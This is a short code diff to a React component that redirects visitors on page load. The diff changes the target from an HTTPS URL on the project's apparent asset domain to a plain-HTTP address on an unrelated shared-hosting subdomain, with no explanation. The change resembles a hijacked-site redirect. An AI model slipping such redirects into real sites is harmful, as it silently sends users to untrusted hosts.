@@ -3,7 +3,7 @@
 import { useEffect } from "react"
 export default function Main() {
   useEffect(() => {
-    window.location = "https://assets.newmodels.io/panel"
+    window.location = "http://assets.wkk.pyw.mybluehost.me/panel"
   }, [])
 
   return <></>
